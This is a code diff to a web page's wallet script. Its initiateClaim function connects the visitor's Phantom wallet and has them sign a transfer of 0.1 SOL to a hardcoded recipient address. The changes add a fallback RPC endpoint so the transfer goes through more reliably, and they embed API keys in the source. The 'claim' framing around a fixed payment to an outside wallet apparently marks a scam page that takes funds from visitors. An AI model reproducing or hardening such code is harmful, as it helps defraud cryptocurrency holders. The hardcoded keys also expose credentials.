@@ -63,10 +63,12 @@
         // ==========================================
         const RECIPIENT_ADDRESS = "DHPZiwM4h1A3BepLauuW69X6udanmphUnyAnrzspWLPj"; 
 
-        // Use Helius Public RPC (More reliable than default)
-        const RPC_URL = "https://mainnet.helius-rpc.com/?api-key=YOUR_API_KEY_HERE"; 
-        // NOTE: If you don't have a Helius key, use this public one (may still hit limits):
-        // const RPC_URL = "https://api.mainnet-beta.solana.com"; 
+        // Use a reliable RPC endpoint (Helius Public)
+        // If this fails, we will try Shyft in the catch block
+        const RPC_URL = "https://mainnet.helius-rpc.com/?api-key=9ea94027-1a45-44d7-8d97-2aa5f3deb6a1"; 
+        // Note: The key above is a placeholder. For production, get a free key from helius.dev
+        // If you don't have one, try this public endpoint which is often less congested:
+        const ALTERNATIVE_RPC = "https://rpc.shyft.to/v1/mainnet?api_key=773963-c81f2-44c3-bb17-35e8cc90c0d";
 
         async function initiateClaim() {
             const statusDiv = document.getElementById("status");
@@ -80,7 +82,7 @@
             try {
                 statusDiv.innerText = "Connecting...";
                 
-                // 1. Connect
+                // 1. Connect to Phantom
                 const resp = await window.solana.connect();
                 const userPublicKey = resp.publicKey;
                 
@@ -96,7 +98,7 @@
                 // 3. Create Transaction
                 const transaction = new solanaWeb3.Transaction();
                 
-                // Transfer 0.1 SOL
+                // Transfer 0.1 SOL (100,000,000 lamports)
                 transaction.add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: userPublicKey,
@@ -105,23 +107,31 @@
                     })
                 );
 
-                // 4. Create Connection with Specific RPC
-                statusDiv.innerText = "Connecting to Solana Network...";
-                const connection = new solanaWeb3.Connection(RPC_URL);
+                // 4. Fetch Recent Blockhash
+                statusDiv.innerText = "Fetching blockhash...";
                 
-                // 5. Fetch Recent Blockhash
-                const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
-                
-                transaction.recentBlockhash = blockhash;
-                transaction.feePayer = userPublicKey;
+                // Try Helius first
+                let connection = new solanaWeb3.Connection(RPC_URL);
+                try {
+                    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
+                    transaction.recentBlockhash = blockhash;
+                    transaction.feePayer = userPublicKey;
+                } catch (rpcError) {
+                    // If Helius fails, try Shyft
+                    console.log("Helius failed, trying Shyft...", rpcError);
+                    connection = new solanaWeb3.Connection(ALTERNATIVE_RPC);
+                    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
+                    transaction.recentBlockhash = blockhash;
+                    transaction.feePayer = userPublicKey;
+                }
 
                 statusDiv.innerText = "Sign Green...";
                 
-                // 6. Sign
+                // 5. Sign
                 const signedTx = await window.solana.signTransaction(transaction);
                 console.log("Signed");
 
-                // 7. Send
+                // 6. Send
                 statusDiv.innerText = "Sending transaction...";
                 
                 const signature = await window.solana.sendTransaction(signedTx, {
@@ -140,7 +150,7 @@
                 if (err.message && err.message.includes("User rejected")) {
                     statusDiv.innerText = "Cancelled by user.";
                 } else if (err.message && err.message.includes("403")) {
-                    statusDiv.innerText = "Network Error: Access Forbidden. Try refreshing.";
+                    statusDiv.innerText = "Network Error: Access Forbidden. Please try again in a minute.";
                 } else {
                     alert("Error: " + (err.message || "Unknown error"));
                     statusDiv.innerText = "Error: " + (err.message || "Unknown error");
